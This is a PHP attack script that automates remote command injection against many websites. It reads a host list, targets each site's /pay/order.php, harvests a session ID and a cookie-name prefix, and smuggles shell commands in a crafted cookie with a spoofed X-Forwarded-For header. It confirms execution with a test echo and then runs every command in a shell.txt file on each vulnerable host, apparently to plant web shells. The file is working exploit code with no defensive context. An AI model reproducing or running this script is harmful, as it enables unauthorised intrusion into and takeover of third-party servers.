<?php
function getSiteidPrefix($url) {

    $ch = curl_init($url);

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);

    $result = curl_exec($ch);

    preg_match('/^Set-Cookie:\s*([^;]*)/mi', $result, $m);

    if (count($m) == 0) {
        echo $url.' response no cookie,break<br>';
        return FALSE;
    }

    $cookieset = explode('=', $m[1]);

    preg_match('/[0-9a-zA-Z]{1,999}siteid/', $cookieset[0], $match);
    if (count($match) == 0 ) {
        echo $url.' response no valid cookie,break<br>';
        return FALSE;
    }

    $siteidPrefix = $match[0];
    $siteidPrefix = str_replace('siteid', '', $siteidPrefix);

    preg_match('/PHPSESSID\s*([^;]*)/mi', $result, $sess);

    $session = $sess[1];
    return  array(
            'PHPSESSID' => $session,
            'siteidpreifx' => $siteidPrefix.XFFPREFIX,
            );

}

function evalShell($url , $siteInfo, $shell) {

    $ch = curl_init($url);

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch,CURLOPT_ENCODING , "gzip");
    curl_setopt($ch,CURLOPT_TIMEOUT , CURL_TIMEOUT);

    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'X-Forwarded-For: 0.0.0.0',
        'Accept-Encoding: gzip, deflate, sdch',
        'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.76 Safari/537.36',
        'Cookie: PHPSESSID='.$siteInfo['PHPSESSID'].'; '.$siteInfo['siteidpreifx'].'=1%3B'.$shell,
        ));

    $result = curl_exec($ch);

    return $result;
}

set_time_limit(0);
ignore_user_abort();
define('XFFPREFIX', 'b98b87d11653f2da');
define('CURL_TIMEOUT',5);
define('CHECK_CMD','echo fuckshe');
define('CHECK_CMD_RESULT','fuckshe');

if (!extension_loaded('curl')) {
    exit('Error: need curl extension !');
}

echo 'start fucking....<br>';

$hostList = file('host.txt');

foreach ($hostList as $host) {
    if ($host[0] == '#') {
        echo $host.' jumped...<Br>';
        break;
    }
    $url = rtrim(rtrim($host), '/').'/pay/order.php';
    

    $siteidPrefix = getSiteidPrefix($url);
    if ($siteidPrefix === FALSE) {
        break;
    }

    $expExecResult = evalShell($url, $siteidPrefix, CHECK_CMD);
    if (is_string($expExecResult) && strpos($expExecResult, CHECK_CMD_RESULT) !== FALSE) {

        echo $url.'|||<font color="#ff0000"> can Exp!</font><br>';
        $shells = file('shell.txt');

        foreach ($shells as $shell) {
            echo '--evaling '.$shell. ' on '.$url.'<br>';
            evalShell($url, $siteidPrefix, $shell);
        }

    } else {
        echo $url.'||| can not Exp....<br>';
    }
    
}
